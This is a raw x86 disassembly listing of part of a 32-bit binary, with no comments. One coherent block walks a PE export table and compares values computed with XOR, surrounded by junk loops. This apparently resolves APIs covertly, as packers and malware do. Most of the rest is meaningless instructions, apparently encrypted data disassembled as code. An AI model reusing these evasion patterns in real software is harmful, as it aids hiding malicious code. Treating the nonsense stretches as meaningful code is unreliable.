  40ce11:	xchg   BYTE PTR [ebx-0x53],dl
  40ce14:	xchg   edi,eax
  40ce15:	js     0x40ce72
  40ce17:	fcom   QWORD PTR [esi-0xe]
  40ce1a:	push   ebx
  40ce1b:	mov    esp,0x2f61eb49
  40ce20:	lahf   
  40ce21:	test   DWORD PTR [esp+ebx*4+0xf],ebp
  40ce25:	add    BYTE PTR [ebx],dh
  40ce27:	pop    esi
  40ce28:	(bad)  [edi-0x60]
  40ce2b:	jae    0x40ce87
  40ce2d:	test   DWORD PTR [ecx],esp
  40ce2f:	push   ecx
  40ce30:	add    al,0xf7
  40ce32:	pcmpgtw mm2,QWORD PTR [edx+ebp*2]
  40ce36:	inc    edi
  40ce37:	mov    ah,BYTE PTR [esi-0x58362c0]
  40ce3d:	lahf   
  40ce3e:	sbb    eax,0xc1416642
  40ce43:	adc    DWORD PTR [edi+ebx*8-0x3f],0x62
  40ce48:	xor    al,0x11
  40ce4a:	js     0x40cde7
  40ce4c:	(bad)
  40ce4f:	imul   ebx,esp,0x633ce54e
  40ce55:	ja     0x40ce2b
  40ce57:	dec    esp
  40ce58:	mov    esi,0x62239195
  40ce5d:	int    0xf2
  40ce5f:	sbb    cl,BYTE PTR [ebx]
  40ce61:	sbb    BYTE PTR [eax],bl
  40ce63:	test   BYTE PTR [edx],bl
  40ce65:	adc    ebp,DWORD PTR ds:0x8c802f04
  40ce6b:	inc    ebp
  40ce6c:	pop    ecx
  40ce6d:	pop    esi
  40ce6e:	int    0xb8
  40ce70:	repnz xor ebp,DWORD PTR [ebp+0x31]
  40ce74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce75:	add    esp,DWORD PTR [eax]
  40ce77:	fwait
  40ce78:	mov    esi,ss
  40ce7a:	cli    
  40ce7b:	push   es
  40ce7c:	mov    ebp,0x37e745cf
  40ce81:	cli    
  40ce82:	cli    
  40ce83:	fisub  WORD PTR [ebp+0x17c975f8]
  40ce89:	mov    al,0x25
  40ce8b:	test   DWORD PTR [esi-0x8],0x74d271d8
  40ce92:	adc    ebx,ebp
  40ce94:	inc    esp
  40ce95:	pop    ebp
  40ce96:	adc    BYTE PTR [esi],al
  40ce98:	mov    dh,0x8b
  40ce9a:	inc    ebp
  40ce9b:	cld    
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42aa13
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42aa1b
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42aa1f
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42aa23
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42aa27
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x30b71153]
  40d217:	xchg   ebp,eax
  40d218:	sub    eax,0x8383d255
  40d21d:	icebp  
  40d21e:	pusha  
  40d21f:	add    DWORD PTR [ebx-0x68023786],0x72
  40d226:	sbb    eax,0x775d52f
  40d22b:	rol    DWORD PTR [ebx],0xc5
  40d22e:	dec    ecx
  40d22f:	or     eax,0x22ebcd95
  40d234:	or     al,0x70
  40d236:	out    dx,al
  40d237:	push   ebp
  40d238:	sub    DWORD PTR [esi+0xc],esi
  40d23b:	push   cs
  40d23c:	cli    
  40d23d:	ss das 
  40d23f:	xor    BYTE PTR [esi-0x2c7cbaf1],cl
  40d245:	ret    0x31ca
  40d248:	fs cmp eax,0xd8c8574c
  40d24e:	test   BYTE PTR [ecx+0x6e],ah
  40d251:	daa    
  40d252:	ss adc al,0x76
  40d255:	mul    BYTE PTR [ecx+0x38]
  40d258:	jns    0x40d2b0
  40d25a:	sub    BYTE PTR [ebx-0x2c25738d],bh
  40d260:	les    esp,FWORD PTR [ebp-0x2a98e1eb]
  40d266:	mov    edx,0x5fcb1f16
  40d26b:	sti    
  40d26c:	stos   BYTE PTR es:[edi],al
  40d26d:	cmp    dh,BYTE PTR [esi-0x25bfca54]
  40d273:	xor    BYTE PTR [ebp+0x34],ch
  40d276:	outs   dx,BYTE PTR ds:[esi]
  40d277:	fstp   DWORD PTR [ebx+0x57]
  40d27a:	inc    esp
  40d27b:	and    ch,BYTE PTR [edx+esi*1-0x3d]
  40d27f:	lds    ebp,FWORD PTR [edx+eiz*4+0x9079ce7]
  40d286:	je     0x40d226
  40d288:	sub    al,0xb8
  40d28a:	test   al,0x50
  40d28c:	je     0x40d2ab
  40d28e:	ror    BYTE PTR [esi],0xdb
  40d291:	inc    ecx
  40d292:	push   ds
  40d293:	lods   al,BYTE PTR ds:[esi]
  40d294:	push   ecx
  40d295:	test   BYTE PTR [eax-0x33bbb6b7],0xdc
  40d29c:	xchg   ebp,eax
  40d29d:	push   cs
  40d29e:	js     0x40d26c
  40d2a0:	test   DWORD PTR [ebx+0x44d4823e],0xaa963893
  40d2aa:	mov    ebx,0xcfec1d4f
  40d2af:	fld    DWORD PTR [edx]
  40d2b1:	push   ecx
  40d2b2:	pop    ebp
  40d2b3:	mov    bh,0x7d
  40d2b5:	cmp    ah,BYTE PTR [ecx]
  40d2b7:	repnz adc BYTE PTR [edx+0x56],ah
  40d2bb:	shl    dl,0x5d
  40d2be:	xchg   ecx,eax
  40d2bf:	mov    ch,0xad
  40d2c1:	loope  0x40d294
  40d2c3:	into   
  40d2c4:	shl    DWORD PTR [eax],0x32
  40d2c7:	xor    DWORD PTR [ecx+0x16c6ea94],0x2c
  40d2ce:	popf   
  40d2cf:	xor    BYTE PTR [ecx],cl
  40d2d1:	les    eax,FWORD PTR es:[edi+0x5605a9b0]
  40d2d8:	xchg   edx,eax
  40d2d9:	adc    eax,DWORD PTR [eax-0x32]
  40d2dc:	lahf   
  40d2dd:	outs   dx,BYTE PTR ds:[esi]
  40d2de:	nop
  40d2df:	mov    bl,0xf0
  40d2e1:	push   edx
  40d2e2:	call   0x923a:0xa19a80b4
  40d2e9:	cs and al,0x4a
  40d2ec:	pop    esi
  40d2ed:	daa    
  40d2ee:	mov    ds:0xcf1b0d5c,al
  40d2f3:	sbb    ebx,DWORD PTR [eax]
  40d2f5:	int3   
  40d2f6:	ds fmul st,st(1)
  40d2f9:	adc    ebx,edi
  40d2fb:	dec    ecx
  40d2fc:	jl     0x40d29c
  40d2fe:	call   0x7c31ed06
  40d303:	(bad)  
  40d304:	cmp    eax,0x6fc26f17
  40d309:	cli    
  40d30a:	mov    edi,edi
  40d30c:	das    
  40d30d:	adc    DWORD PTR [ecx+0x7d],ebx
  40d310:	mov    edx,0x9468e7ac
  40d315:	inc    ecx
  40d316:	or     BYTE PTR [edx],bl
  40d318:	and    al,0xdb
  40d31a:	mul    BYTE PTR [edi]
  40d31c:	repnz int3 
  40d31e:	jmp    0x4c4b:0x2889d153
  40d325:	xchg   esi,eax
  40d326:	stos   BYTE PTR es:[edi],al
  40d327:	add    eax,0x72965e9b
  40d32c:	div    bl
  40d32e:	jmp    0xc274f893
  40d333:	sub    al,0x14
  40d335:	(bad)  
  40d336:	pop    edx
  40d337:	(bad)  
  40d339:	ds adc eax,0x35f6d9ab
  40d33f:	das    
  40d340:	mov    eax,0x5db7cf8e
  40d345:	pop    ss
  40d346:	faddp  st(4),st
  40d348:	inc    ecx
  40d349:	mov    ebp,0xbb3af301
  40d34e:	jne    0x40d358
  40d350:	xchg   esp,eax
  40d351:	fstp   TBYTE PTR [esi+eax*4-0x53]
  40d355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d356:	add    DWORD PTR [eax+0x1e],esp
  40d359:	jo     0x40d30e
  40d35b:	popf   
  40d35c:	loop   0x40d37f
  40d35e:	inc    esp
  40d35f:	add    ah,al
  40d361:	rcr    BYTE PTR [edi-0x36],1
  40d364:	xchg   edx,eax
  40d365:	push   cs
  40d366:	inc    ecx
  40d367:	or     eax,0x767cb9e8
  40d36c:	test   bl,ah
  40d36e:	sbb    cl,BYTE PTR [ebp-0x17c9ffe9]
  40d374:	mov    ebx,0x662af823
  40d379:	jmp    0x40d382
  40d37b:	call   0x2a9e:0x56a976d4
  40d382:	lods   eax,DWORD PTR ds:[esi]
  40d383:	add    al,0xf0
  40d385:	scas   al,BYTE PTR es:[edi]
  40d386:	push   0x21ccb40e
  40d38b:	dec    edi
  40d38c:	sahf   
  40d38d:	adc    BYTE PTR [edx],bl
  40d38f:	stos   DWORD PTR es:[edi],eax
  40d390:	js     0x40d3d3
  40d392:	loop   0x40d404
  40d394:	sbb    DWORD PTR [ecx],ecx
  40d396:	jae    0x40d37c
  40d398:	or     bl,cl
  40d39a:	aaa    
  40d39b:	or     DWORD PTR [ecx+0x43],eax
  40d39e:	push   esi
  40d39f:	fld    TBYTE PTR [ecx+0x12]
  40d3a2:	sub    dh,BYTE PTR [ebp+ebx*2+0x1f]
  40d3a6:	cld    
  40d3a7:	lea    eax,[ecx+0x52]
  40d3aa:	mov    ah,0x2c
  40d3ac:	stos   BYTE PTR es:[edi],al
  40d3ad:	mov    esi,0xdb0591c8
  40d3b2:	fadd   QWORD PTR [ebp-0x2d]
  40d3b5:	jg     0x40d3ad
  40d3b7:	pop    edi
  40d3b8:	jne    0x40d416
  40d3ba:	ror    DWORD PTR [eax+0x38],0x98
  40d3be:	pop    ds
  40d3bf:	jg     0x40d3b9
  40d3c1:	mov    bl,0xf9
  40d3c3:	or     eax,0x1534c19f
  40d3c8:	xchg   ebx,eax
  40d3c9:	ja     0x40d443
  40d3cb:	sub    al,0xf3
  40d3cd:	lods   eax,DWORD PTR ds:[esi]
  40d3ce:	dec    esp
  40d3cf:	mov    bl,0x49
  40d3d1:	dec    esi
  40d3d2:	js     0x40d453
  40d3d4:	sub    DWORD PTR [eax+0x70f80079],esi
  40d3da:	push   edx
  40d3db:	shl    eax,cl
  40d3dd:	out    dx,eax
  40d3de:	ret    0x6f4d
  40d3e1:	div    BYTE PTR [eax]
  40d3e3:	pop    edi
  40d3e4:	pop    ss
  40d3e5:	scas   al,BYTE PTR es:[edi]
  40d3e6:	es inc esi
  40d3e8:	dec    edi
  40d3e9:	add    BYTE PTR [ebp-0x24d25fdf],0x17
  40d3f0:	ss xor BYTE PTR gs:[edi+0x34],al
  40d3f5:	dec    ebx
  40d3f6:	pushf  
  40d3f7:	jo     0x40d418
  40d3f9:	push   cs
  40d3fa:	mov    ch,0x6b
  40d3fc:	pop    esi
  40d3fd:	mov    dl,0x2e
  40d3ff:	sub    eax,0x73e69027
  40d404:	div    BYTE PTR [edi-0x8a7cc5f]
  40d40a:	retf   
  40d40b:	add    al,bl
  40d40d:	into   
  40d40e:	lea    eax,[eax-0x3eb57fb1]
  40d414:	adc    DWORD PTR [esi],eax
  40d416:	ss inc ebx
  40d418:	xchg   edi,eax
  40d419:	shr    DWORD PTR [ecx],cl
  40d41b:	scas   eax,DWORD PTR es:[edi]
  40d41c:	cld    
  40d41d:	and    BYTE PTR [ecx-0x7f],bh
  40d420:	into   
  40d421:	xor    eax,0xc83816ed
  40d426:	mov    eax,ds:0xe01a3714
  40d42b:	int3   
  40d42c:	add    eax,0x8d28758e
  40d431:	into   
  40d432:	popf   
  40d433:	pop    es
  40d434:	adc    BYTE PTR [ebp-0x2d],bh
  40d437:	mov    WORD PTR [esi-0x2],ds
  40d43a:	mov    al,0xa9
  40d43c:	push   esp
  40d43d:	inc    esi
  40d43e:	cmp    DWORD PTR [ecx],ebp
  40d440:	in     eax,0x33
  40d442:	xchg   esp,eax
  40d443:	xor    edi,DWORD PTR [ebx]
  40d445:	mov    ebp,0x2edbd41b
  40d44a:	jge    0x40d407
  40d44c:	outs   dx,BYTE PTR ds:[esi]
  40d44d:	xor    al,cl
  40d44f:	adc    BYTE PTR [eax],al
  40d451:	mov    ah,ch
  40d453:	bound  esi,QWORD PTR [edi-0x46]
  40d456:	mov    ebp,0x4a6931fa
  40d45b:	xchg   DWORD PTR ds:0xe2081cf3,ebx
  40d461:	push   es
  40d462:	or     DWORD PTR [esp+edx*2],edx
  40d465:	imul   eax,DWORD PTR [eax+0x548d07b4],0x2f429bca
  40d46f:	inc    ebp
  40d470:	sbb    esi,DWORD PTR [esp+edx*4-0x2da86c99]
  40d477:	imul   eax,DWORD PTR [ebp-0x3f],0xbdc45ddc
  40d47e:	adc    dh,bh
  40d480:	pop    es
  40d481:	add    DWORD PTR [ebx+eax*2-0x49f7b648],edi
  40d488:	nop
  40d489:	xchg   ebx,eax
  40d48a:	push   ss
  40d48b:	test   BYTE PTR [esi],dh
  40d48d:	aas    
  40d48e:	mov    ds:0x5cb7ebbf,eax
  40d493:	in     al,0xdb
  40d495:	lds    esp,FWORD PTR [eax+0x16f2b374]
  40d49b:	push   ebx
  40d49c:	cmp    ch,BYTE PTR [edi+0x4a99bcc4]
  40d4a2:	aas    
  40d4a3:	outs   dx,BYTE PTR ds:[esi]
  40d4a4:	add    ah,BYTE PTR [eax+0x9419595]
  40d4aa:	adc    eax,0x7dce7e83
  40d4af:	sti    
  40d4b0:	ins    DWORD PTR es:[edi],dx
  40d4b1:	dec    edi
  40d4b2:	mov    al,0x38
  40d4b4:	ror    ecx,1
  40d4b6:	test   al,0xd7
  40d4b8:	push   es
  40d4b9:	push   ds
  40d4ba:	das    
  40d4bb:	bound  edx,QWORD PTR [edx-0x80]
  40d4be:	jmp    0x40d4f3
  40d4c0:	cmp    DWORD PTR [eax],edx
  40d4c2:	xor    DWORD PTR ds:0x946497ab,0x8c79d843
  40d4cc:	adc    dh,cl
  40d4ce:	fstp   DWORD PTR [edi+0xc26410d]
  40d4d4:	add    BYTE PTR [ecx+0x422a7dd5],al
  40d4da:	cmp    al,0xbd
  40d4dc:	das    
  40d4dd:	aam    0xba
  40d4df:	repz sti 
  40d4e1:	(bad)  
  40d4e2:	pop    ecx
  40d4e3:	in     eax,0x4e
  40d4e5:	inc    edi
  40d4e6:	ins    DWORD PTR es:[edi],dx
  40d4e7:	(bad)  
  40d4e8:	cmp    DWORD PTR [ebx+0x23665296],edi
  40d4ee:	sar    BYTE PTR [edx],1
  40d4f0:	mov    esp,0xd523a1fa
  40d4f5:	pop    ebx
  40d4f6:	mov    ds:0xa881d44c,eax
  40d4fb:	sub    dh,BYTE PTR [ebp+0x1fc8325a]
  40d501:	add    ch,bl
  40d503:	lds    ecx,FWORD PTR [ebp+esi*2+0x37]
  40d507:	mov    ebx,DWORD PTR ds:0xdb120a5a
  40d50d:	sti    
  40d50e:	inc    esp
  40d50f:	cmp    al,0x9a
  40d511:	pop    eax
  40d512:	mov    gs,WORD PTR [eax+ecx*8+0x3968530d]
  40d519:	ins    BYTE PTR es:[edi],dx
  40d51a:	inc    ebp
  40d51b:	jb     0x40d4f8
  40d51d:	or     BYTE PTR [edx],dl
  40d51f:	push   eax
  40d520:	pop    esp
  40d521:	inc    esp
  40d522:	mov    ecx,0x4477e4c5
  40d527:	cld    
  40d528:	arpl   ax,bp
  40d52a:	xchg   ecx,eax
  40d52b:	cmp    eax,ecx
  40d52d:	jno    0x40d54f
  40d52f:	int3   
  40d530:	or     bl,BYTE PTR [edx]
  40d532:	iret   
  40d533:	inc    edx
  40d534:	mov    edi,0xdb5f1e5f
  40d539:	jno    0x40d5a9
  40d53b:	jmp    FWORD PTR [eax+0x7f]
  40d53e:	lods   eax,DWORD PTR ds:[esi]
  40d53f:	adc    al,0x8f
  40d541:	adc    al,BYTE PTR [edx-0x52752e2b]
  40d547:	or     esp,0x6a
  40d54a:	and    DWORD PTR [ebp-0x2bf4b35e],0x16a4b335
  40d554:	push   edx
  40d555:	je     0x40d531
  40d557:	icebp  
  40d558:	cmp    eax,esp
  40d55a:	pop    es
  40d55b:	popa   
  40d55c:	icebp  
  40d55d:	push   es
  40d55e:	cmp    cl,ch
  40d560:	xchg   ebx,eax
  40d561:	cmp    eax,0x270f7fac
  40d566:	stos   BYTE PTR es:[edi],al
  40d567:	ss pop ebp
  40d569:	shl    BYTE PTR [edx+0x4033df4f],1
  40d56f:	mov    eax,ds:0xc9ad2a89
  40d574:	cdq    
  40d575:	rcr    BYTE PTR [ebx],cl
  40d577:	aas    
  40d578:	mov    WORD PTR [eax],ss
  40d57a:	aam    0xa3
  40d57c:	cmp    ecx,esp
  40d57e:	(bad)  
  40d580:	scas   al,BYTE PTR es:[edi]
  40d581:	ret    
  40d582:	retf   
  40d583:	push   ebx
  40d584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d585:	fmul   DWORD PTR [edx+0x47]
  40d588:	lahf   
  40d589:	jns    0x40d5a9
  40d58b:	pop    es
  40d58c:	out    dx,eax
  40d58d:	aam    0xee
  40d58f:	lods   eax,DWORD PTR ds:[esi]
  40d590:	clc    
  40d591:	pop    ds
  40d592:	sbb    BYTE PTR [ecx*8-0x2fce48c6],0xc7
  40d59a:	lods   al,BYTE PTR ds:[esi]
  40d59b:	imul   esi,DWORD PTR [edi-0x642b6d80],0xffffffdd
  40d5a2:	mov    bh,0x16
  40d5a4:	sub    BYTE PTR ds:0xd30915c5,bl
  40d5aa:	cmp    BYTE PTR [edx+0x5383c6c8],ch
  40d5b0:	mov    ebx,0x3db25d40
  40d5b5:	adc    al,0x78
  40d5b7:	and    DWORD PTR [ecx],esp
  40d5b9:	(bad)  
  40d5ba:	stc    
  40d5bb:	aas    
  40d5bc:	or     DWORD PTR [ebx+0x1c62cebe],0x41
  40d5c3:	fisttp WORD PTR ds:0x6bd677aa
  40d5c9:	ss fs dec esp
  40d5cc:	push   0xffffffa9
  40d5ce:	call   0x3f6e:0x300a5316
  40d5d5:	mov    eax,0xfeafc4e0
  40d5da:	xchg   ebp,eax
  40d5db:	mov    ah,ch
  40d5dd:	daa    
  40d5de:	inc    ecx
  40d5df:	(bad)  
  40d5e0:	lock mov bh,0x29
  40d5e3:	inc    ecx
  40d5e4:	stos   BYTE PTR es:[edi],al
  40d5e5:	pop    ebp
  40d5e6:	aam    0x12
  40d5e8:	xlat   BYTE PTR ds:[ebx]
  40d5e9:	sti    
  40d5ea:	xchg   DWORD PTR ds:[ecx+0x755951a6],edx
  40d5f1:	out    dx,eax
  40d5f2:	inc    edi
  40d5f3:	(bad)  
  40d5f4:	xchg   esp,eax
  40d5f5:	mov    al,0x87
  40d5f7:	fbld   TBYTE PTR [edx+ebp*4-0x3c]
  40d5fb:	add    al,0x3e
  40d5fd:	mov    ds:0x93a75071,eax
  40d602:	outs   dx,BYTE PTR ds:[esi]
  40d603:	shl    ebx,1
  40d605:	push   edx
  40d606:	push   es
  40d607:	shl    ebp,1
  40d609:	mov    DWORD PTR ds:0x5bf20edf,ecx
  40d60f:	xor    al,0x2f
  40d611:	cmp    BYTE PTR [ecx-0x71],0xd
  40d615:	fwait
  40d616:	jg     0x40d67e
  40d618:	outs   dx,DWORD PTR ds:[esi]
  40d619:	jl     0x40d606
  40d61b:	mov    ?,WORD PTR [ebx-0x59]
  40d61e:	inc    esi
  40d61f:	adc    eax,0x37547d42
  40d624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d625:	and    eax,edi
  40d627:	and    BYTE PTR [ebp+0x25],dh
  40d62a:	icebp  
  40d62b:	(bad)
  40d62e:	mov    ah,0x71
  40d630:	enter  0x28b6,0x1
  40d634:	pop    esp
  40d635:	adc    DWORD PTR [ebx+ecx*1+0x3785e6b1],eax
  40d63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d63d:	out    0x42,eax
  40d63f:	sub    eax,0x39f1c8d0
  40d644:	sub    eax,DWORD PTR [ecx+0x1f]
  40d647:	pop    edx
  40d648:	push   es
  40d649:	test   al,0xd9
  40d64b:	cs aas 
  40d64d:	or     bh,BYTE PTR [edx]
  40d64f:	push   esi
  40d650:	mov    ch,0xf6
  40d652:	adc    al,0x65
  40d654:	lahf   
  40d655:	rol    BYTE PTR [edx+esi*1-0x6],cl
  40d659:	add    ebx,esi
  40d65b:	outs   dx,BYTE PTR ds:[esi]
  40d65c:	pop    eax
  40d65d:	cmp    ch,bh
  40d65f:	adc    cl,BYTE PTR [esp+eax*2]
  40d662:	loop   0x40d6a7
  40d664:	or     BYTE PTR [ecx-0x49b63abf],bh
  40d66a:	push   ebx
  40d66b:	aas    
  40d66c:	sbb    eax,DWORD PTR [esi]
  40d66e:	xor    al,BYTE PTR [ebx+0x376d1e69]
  40d674:	add    dl,ch
  40d676:	lahf   
  40d677:	iret   
  40d678:	cmp    DWORD PTR [edi-0x2258816c],edi
  40d67e:	iret   
  40d67f:	jle    0x40d652
  40d681:	cld    
  40d682:	cdq    
  40d683:	into   
  40d684:	arpl   WORD PTR [ebp+esi*2-0x59f3ad83],bp
  40d68b:	xor    al,0x2
  40d68d:	or     BYTE PTR ds:0x8e320038,cl
  40d693:	je     0x40d662
  40d695:	ret    
  40d696:	cmp    DWORD PTR ds:0x23a4f9ac,esi
  40d69c:	add    eax,0xefaedb4e
  40d6a1:	xchg   edx,eax
  40d6a2:	add    eax,0x3555f591
  40d6a7:	mov    esi,DWORD PTR [ebx+0x46441024]
  40d6ad:	sbb    dl,dh
  40d6af:	bound  ebp,QWORD PTR [ebx]
  40d6b1:	and    dl,ch
  40d6b3:	jbe    0x40d6d3
  40d6b5:	mov    fs,ax
  40d6b8:	mov    edx,0xf8f203d3
  40d6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6be:	mov    al,0xcc
  40d6c0:	jbe    0x40d658
  40d6c2:	pop    es
  40d6c3:	pop    edx
  40d6c4:	xor    esi,ebx
  40d6c6:	test   BYTE PTR [eax],bh
  40d6c8:	(bad)  
